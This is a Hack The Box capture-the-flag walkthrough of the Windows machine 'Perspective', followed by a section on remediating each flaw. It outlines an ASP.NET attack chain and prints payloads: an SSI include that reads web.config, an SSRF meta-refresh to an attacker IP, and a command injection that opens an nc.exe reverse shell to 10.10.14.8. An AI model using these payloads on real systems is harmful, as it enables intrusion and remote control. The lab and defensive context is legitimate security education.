---
title: "Perspective HTB - Insane Windows Box Walkthrough"
date: 2025-09-22T05:45:00Z
tags: ["insane-windows", "web", "ssi", "lfi", "ssrf", "viewstate-deserialization", "padding-oracle", "command-injection", "privilege-escalation"]
difficulty: ["insane"]
categories: ["HTB", "Windows"]
draft: false
description: "Complete walkthrough of Perspective HTB machine featuring ASP.NET vulnerabilities, SSI-based LFI, ViewState deserialization, SSRF, padding oracle attacks, and privilege escalation"
---

# Perspective HTB - Insane Windows Box Walkthrough

{{< youtube tmK0GIvnq6s >}}

Perspective is an Insane difficulty Windows machine from Hack The Box that showcases advanced ASP.NET exploitation techniques. This machine requires expertise in web application security, cryptographic attacks, and Windows privilege escalation, featuring a complex attack chain involving Server-Side Includes, ViewState deserialization, SSRF, and padding oracle attacks.

## Key Exploitation Steps and Techniques (Chronological Order)

### Phase 1: Initial Reconnaissance and Web Application Discovery

#### 1. Port Scanning and Host Discovery
- Perform Nmap scan on the target IP (10.10.11.151) to identify open ports: SSH (22) and HTTP (80) running IIS
- Access the web app on port 80, which redirects to perspective.htb (add to /etc/hosts)
- Identify the web app as an ASP.NET application by testing file extensions (e.g., .aspx gives different 404 error)
- **Technique**: Basic reconnaissance with Nmap (`-sC -sV`); virtual host enumeration and ASP.NET fingerprinting via HTTP responses

#### 2. User Registration and Login
- Register a user account (e.g., root@perspective.htb) and log in
- Test password reset functionality, noting security questions and a token in the request
- **Technique**: Manual web application testing and account creation for access

### Phase 2: File Upload Exploitation and Local File Inclusion

#### 3. File Upload Vulnerability Testing
- As logged-in user, upload products with images
- Fuzz allowed file extensions using ffuf on the upload request, identifying extensions like .php4, .shtml, etc.
- Attempt PHP upload fails to execute, but .shtml allows Server-Side Includes (SSI)
- **Technique**: Extension fuzzing with ffuf; SSI testing with various file types

#### 4. Local File Inclusion (LFI) via SSI in .shtml
- Upload .shtml file with SSI directive (`<!--#include file="web.config"-->` or similar) to read web.config
- Traverse directories (e.g., `../web.config`) to read root web.config
- Extract key info: Machine key (validationKey and decryptionKey), encrypted viewStateUserKey, MSSQL connection string, and reference to Secure Password Service on localhost:8000
- **Technique**: Server-Side Includes (SSI) exploitation for Local File Inclusion; path traversal via SSI directives

### Phase 3: ASP.NET Authentication Bypass and Admin Access

#### 5. Forge Admin Cookie (.ASPXAUTH)
- Use machine key from web.config to decrypt an existing .ASPXAUTH cookie (using custom .NET tool from GitHub: AFNetCryptoTools)
- Modify decrypted ticket to admin@perspective.htb, re-encrypt, and set as cookie to gain admin access
- **Technique**: ASP.NET Forms Authentication bypass via machine key abuse; cookie manipulation with AFNetCryptoTools

#### 6. SSRF via PDF Generation in Admin Panel
- As admin, load user data and generate PDF
- Inject HTML (e.g., `<meta http-equiv="refresh" content="0;url=http://10.10.14.8:8000/pwned.html">`) into product description to trigger SSRF during PDF rendering (using headless Chrome)
- Redirect to localhost:8000 to access Secure Password Service API
- Fetch `/swagger/v1/swagger.json` to understand API: `/encrypt` (GET) and `/decrypt` (POST) endpoints
- **Technique**: Server-Side Request Forgery (SSRF) via HTML injection in PDF generation; API discovery through Swagger documentation

#### 7. Decrypt viewStateUserKey via CSRF in SSRF
- Craft HTML form in redirected page to POST to `http://127.0.0.1:8000/decrypt` with `ciphertext=encoded_viewStateUserKey`
- Use JavaScript to auto-submit form (bypassing CSRF protections)
- Generate PDF to trigger, revealing decrypted viewStateUserKey ("saltySaltyViewState3")
- **Technique**: Cross-Site Request Forgery (CSRF) via SSRF; automatic form submission with JavaScript

### Phase 4: Remote Code Execution via ViewState Deserialization

#### 8. RCE via Malicious ViewState Deserialization
- Use ysoserial.net with ViewState plugin, TypeConfuseDelegate gadget, machine key, decryption/validation algorithms, viewStateUserKey, and generator from a request
- Command: `ping 10.10.14.8` (test), then PowerShell reverse shell (encoded base64)
- Intercept request, replace `__VIEWSTATE` with malicious blob to get RCE as webuser
- **Technique**: .NET deserialization attack via malicious ViewState; ysoserial.net with TypeConfuseDelegate gadget

#### 9. Stable Shell via SSH
- From reverse shell (as webuser), extract `~/.ssh/id_rsa`
- Copy to attack machine, chmod 600, and SSH as webuser@10.10.11.151
- **Technique**: SSH key extraction and persistent access via key-based authentication

### Phase 5: Staging Application Discovery and Padding Oracle Attack

#### 10. Access Staging App via Port Forward
- From SSH shell, identify listening ports (e.g., 8009 via netstat)
- Local port forward: `ssh -L 8009:127.0.0.1:8009`
- Access `http://127.0.0.1:8009` (staging app, environment=staging, auto-generated machine keys preventing deserial)
- **Technique**: SSH local port forwarding for internal service access; network reconnaissance via netstat

#### 11. Padding Oracle Attack on Staging Password Reset Token
- In staging app, register user and initiate password reset to get encrypted token
- Use PadBuster on token (block size 16, URL-encoded base64, post data, error string "padding is invalid")
- Plaintext: Craft command injection (e.g., `"root@perspective.htb && c:\programdata\nc.exe 10.10.14.8 9001 -e cmd.exe"`)
- Encrypt with PadBuster and submit in reset request to get reverse shell as administrator (due to staging running as admin)
- **Technique**: Padding Oracle attack with PadBuster; command injection via encrypted token manipulation

### Phase 6: Privilege Escalation to SYSTEM

#### 12. Privilege Escalation to SYSTEM via JuicyPotato
- As administrator, upload JuicyPotato.exe and test.bat (with reverse shell)
- Scan for unfiltered COM ports (e.g., 443)
- Run JuicyPotato with `-p shell.bat -t * -l 443` to get shell as SYSTEM
- **Technique**: Windows privilege escalation via JuicyPotato (SeImpersonatePrivilege abuse); COM port scanning for firewall bypass

## Security Gaps and Remediation

This machine demonstrates multiple critical security vulnerabilities across different services:

### IIS Web Server (Production on Port 80)
- **Gap**: Local File Inclusion (LFI) via Server-Side Includes (SSI) in uploaded .shtml files allows reading sensitive files like web.config by uploading files with SSI directives (e.g., `<!--#include file="../web.config"-->`)
- **Fix**: Configuration fix - Disable SSI handling in IIS by removing or disabling the ServerSideIncludeModule in the web.config or IIS Manager (under Modules). Alternatively, source code fix - Implement strict file extension validation and content scanning in the upload handler to block SSI directives

- **Gap**: Insecure password reset mechanism allowing IDOR-like bypass where users can intercept and modify the email parameter in the reset request to target other accounts (e.g., admin), bypassing security questions
- **Fix**: Source code fix - Validate that the email in the reset submission matches the one associated with the token/session. Add proper authorization checks to ensure the user owns the account. Configuration fix - Enable email-based reset links instead of direct token-based changes

- **Gap**: Weak file upload validation allowing dangerous extensions like .shtml, .php4, etc., leading to potential code execution or LFI
- **Fix**: Source code fix - Strengthen server-side validation to whitelist only safe extensions (e.g., .jpg, .png) and verify MIME types/content. Configuration fix - Use IIS Request Filtering to block unsafe extensions globally

- **Gap**: Exposure of sensitive data in web.config file readable via LFI, leaking machine keys, connection strings, and encrypted viewStateUserKey
- **Fix**: Configuration fix - Set proper file permissions in IIS to deny read access to web.config for web users, or move sensitive keys to a secure external store (e.g., Azure Key Vault or encrypted config sections)

- **Gap**: ViewState deserialization vulnerability leading to RCE when machine keys and viewStateUserKey are known, allowing attackers to craft malicious ViewStates for code execution
- **Fix**: Configuration fix - Enable ViewState MAC and use auto-generated machine keys with isolateApps="true" in web.config to prevent key reuse. Source code fix - Implement custom ViewState validation or switch to stateless alternatives

- **Gap**: SSRF via HTML injection in PDF generation where injected HTML (e.g., meta refresh) in product descriptions allows redirecting the PDF renderer (headless Chrome) to internal services like localhost:8000
- **Fix**: Source code fix - Sanitize user input to strip dangerous HTML tags/attributes (e.g., using HtmlSanitizer library). Configuration fix - Run PDF generation in a sandboxed environment or block internal network access in the renderer process

### Secure Password Service (API on localhost:8000)
- **Gap**: Exposed to SSRF where service listens only on localhost but accessible via SSRF from the web app, allowing decryption of sensitive values like viewStateUserKey
- **Fix**: Configuration fix - Bind the service to a Unix socket or use firewall rules (e.g., Windows Firewall) to restrict access. Source code fix - Add authentication/authorization to endpoints

- **Gap**: Lack of CSRF protection on /decrypt endpoint allows auto-submitting forms via SSRF/CSRF to decrypt arbitrary ciphertexts
- **Fix**: Source code fix - Implement CSRF tokens or check Origin/Referer headers on POST requests

### Staging Web App (on Port 8009)
- **Gap**: Padding Oracle vulnerability in password reset token decryption where invalid padding leaks decryption errors, enabling PadBuster attacks to decrypt/encrypt tokens
- **Fix**: Source code fix - Use authenticated encryption modes (e.g., AES-GCM) instead of CBC with padding, or handle errors without leaking padding details

- **Gap**: Command injection in password reset execution where decrypted token is passed to cmd.exe without sanitization (e.g., password_reset.exe [token] [password]), allowing && for appending commands
- **Fix**: Source code fix - Properly escape or parameterize inputs when executing external commands (e.g., use ProcessStartInfo with arguments array in .NET)

- **Gap**: Running as privileged user (Administrator) allows direct system access upon exploitation
- **Fix**: Configuration fix - Configure IIS app pool to run as a low-privilege user (e.g., NetworkService) in IIS Manager

### Windows System and SSH
- **Gap**: SeImpersonatePrivilege enabled for webuser allows privilege escalation via tools like JuicyPotato
- **Fix**: Configuration fix - Remove unnecessary privileges from the webuser account via Group Policy or secpol.msc

- **Gap**: SSH private key exposed in webuser home directory, accessible after web shell, allowing persistent access
- **Fix**: Configuration fix - Use key-based auth with passphrases, or store keys in protected directories with ACLs denying read to web processes

## Conclusion

Perspective is an excellent machine that demonstrates the complexity of modern ASP.NET application security. It requires expertise in:
- Advanced web application exploitation and ASP.NET internals
- Cryptographic attacks including padding oracle and ViewState manipulation
- Server-Side Request Forgery (SSRF) and Cross-Site Request Forgery (CSRF)
- .NET deserialization vulnerabilities and exploit development
- Windows privilege escalation techniques and COM exploitation

The machine emphasizes the importance of defense-in-depth, proper input validation, secure cryptographic implementations, and the principle of least privilege in web application and system security.

---

*This walkthrough covers the complete exploitation chain for educational purposes in authorized testing environments only.*